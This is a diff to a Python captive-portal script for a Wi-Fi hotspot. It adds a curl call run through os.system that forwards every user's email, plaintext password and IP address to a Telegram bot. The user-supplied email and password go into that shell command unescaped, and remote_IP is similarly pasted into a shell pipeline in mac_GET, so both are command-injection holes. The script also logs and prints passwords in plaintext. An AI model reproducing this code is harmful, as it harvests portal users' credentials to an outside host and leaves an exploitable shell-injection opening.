@@ -15,6 +15,14 @@ WAN     = "enp0s3"              # the WAN interface
 #ssl_key_file = "/opt/captivePortal/v1/certificates/allouwifi.com.br.key"
 #ssl_certificate_file = "/opt/captivePortal/v1/certificates/allouwifi.com.br.pem"
 
+def sendAlert(message):
+    bottoken = ""
+    chatid = ""
+    os.system("curl -s -X POST \
+        -H 'Content-Type: application/json' \
+        -d '{\"chat_id\": %s, \"text\": \"%s\", \"disable_notification\": true}' \
+        https://api.telegram.org/bot%s/sendMessage >> /dev/null" % (chatid,message,bottoken))
+
 def mac_GET(remote_IP):
     mac = subprocess.Popen("arp -a |grep -i "+remote_IP+" |awk -F' ' '{print($4)}'", stdout=subprocess.PIPE, shell=True)
     (mac_return, err) = mac.communicate()
@@ -37,6 +45,8 @@ def allowUser(client_ip, email, password):
     LOGIN = 'Nova autenticacao: Email='+ email+' Password='+ password +' remote_IP='+ remote_IP +''
     print(LOGIN)
     writeLog(LOGIN)
+    MESSAGE = 'Nova autenticacao\nEmail: '+ email+'\nPassword: '+ password +'\nRemote_IP: '+ remote_IP +''
+    sendAlert(MESSAGE)
     print('Updating IP tables')
     print('####################################################################################\n\n')
     subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
